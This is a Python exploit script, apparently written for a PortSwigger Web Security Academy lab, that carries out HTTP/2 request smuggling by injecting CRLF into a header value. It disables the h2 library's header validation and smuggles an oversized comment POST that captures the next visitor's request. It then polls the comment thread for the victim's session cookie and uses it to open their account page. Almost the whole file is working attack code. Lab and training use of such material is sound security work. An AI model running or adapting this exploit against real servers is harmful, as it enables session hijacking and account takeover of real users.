#!/usr/bin/env python3
"""
HTTP/2 request smuggling via CRLF injection
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 10-h2-request-smuggling-crlf-injection.md

What this does:
    Injects a raw \\r\\n sequence inside an HTTP/2 header VALUE
    ("foo: bar\\r\\nTransfer-Encoding: chunked") -- legal under HPACK, which
    encodes header values as opaque byte strings, but reinterpreted as a
    real header boundary the moment the front-end downgrades the request to
    HTTP/1.1 text. That reproduces the same H2.TE desync as the
    response-queue-poisoning lab, but reached through header-value
    injection instead of a direct transfer-encoding header. The DATA frame
    carries "0\\r\\n\\r\\n" followed by a complete "POST /post/comment"
    request whose declared Content-Length (1200) is far larger than the
    body we actually send -- so the connection stays open waiting for more
    bytes, and the next real visitor's request on that same connection gets
    appended straight onto our unterminated comment field. Reading the
    comment thread back after a short wait surfaces the captured request,
    session cookie included.

    Getting the h2 library to emit a literal \\r\\n inside a header value
    at all requires validate_outbound_headers=False and
    normalize_outbound_headers=False -- its defaults silently strip or
    reject CRLF sequences during header normalization, which would defeat
    this attack before a single packet left the socket.

Usage:
    python 10-h2-request-smuggling-crlf-injection.py <lab-url>
    e.g. python 10-h2-request-smuggling-crlf-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install h2 httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 10.0):
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass

    return ssl_sock, conn


def send_capture_smuggle(host: str, session: str, csrf: str, post_id: int = 2,
                          capture_length: int = 1200, port: int = 443) -> dict:
    """Send the CRLF-injected H2.TE smuggle carrying an oversized POST
    /post/comment request, so the next visitor's request on this connection
    is captured inside the comment thread."""
    import h2.events as h2e

    ssl_sock, conn = create_h2_connection(host, port)

    comment_body = (
        f"csrf={csrf}&postId={post_id}&name=test&email=test%40test.net"
        f"&website=https%3A%2F%2Ftest.net&comment="
    )
    smuggled = (
        "POST /post/comment HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {capture_length}\r\n"
        f"Cookie: session={session}\r\n\r\n"
        f"{comment_body}"
    )
    crlf_value = "bar\r\nTransfer-Encoding: chunked"
    body = f"0\r\n\r\n{smuggled}".encode()

    headers = [
        (":method", "POST"),
        (":path", "/"),
        (":authority", host),
        (":scheme", "https"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("foo", crlf_value),
    ]

    conn.send_headers(1, headers, end_stream=False)
    conn.send_data(1, body, end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(10)
    result = {"status": None, "data": b""}
    try:
        while True:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.ResponseReceived):
                    result["status"] = dict(event.headers).get(b":status", b"").decode()
                elif isinstance(event, h2e.DataReceived):
                    result["data"] += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    ssl_sock.close()
                    return result
            ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass
    ssl_sock.close()
    return result


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str, post_id: int = 2, poll_attempts: int = 3, poll_interval: float = 10.0) -> None:
    host = urlparse(lab_url).hostname
    client = httpx.Client(follow_redirects=True, timeout=15, verify=False)

    post_url = f"{lab_url}/post?postId={post_id}"
    r = client.get(post_url)
    session_match = re.search(r"session=([^;\s]+)", r.headers.get("set-cookie", ""))
    session = session_match.group(1) if session_match else client.cookies.get("session", "")
    csrf = get_csrf(client, post_url)
    print(f"[*] Our session: {session[:20]}..., CSRF: {csrf}")

    print("[*] Sending CRLF-injected H2.TE capture smuggle against /post/comment...")
    result = send_capture_smuggle(host, session, csrf, post_id=post_id)
    print(f"[*] Smuggle response status: {result.get('status')}")

    for attempt in range(1, poll_attempts + 1):
        time.sleep(poll_interval)
        r2 = client.get(post_url)
        victim_session = re.search(r"session=([a-zA-Z0-9]+)", r2.text)
        if victim_session and victim_session.group(1) != session:
            captured = victim_session.group(1)
            print(f"[+] Captured a victim's session cookie in the comment thread: {captured}")
            r3 = httpx.get(f"{lab_url}/my-account", cookies={"session": captured}, verify=False)
            print(f"[*] /my-account with captured session -- status {r3.status_code}")
            if r3.status_code == 200:
                print("[+] Lab solved -- accessed the victim's account using their captured session cookie.")
            return
        print(f"[*] Poll {attempt}/{poll_attempts}: no victim cookie captured yet.")

    print(f"[-] No victim cookie captured after {poll_attempts} polls -- resend the "
          f"smuggle and try again; this depends on a real visitor's request landing "
          f"on the poisoned connection.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
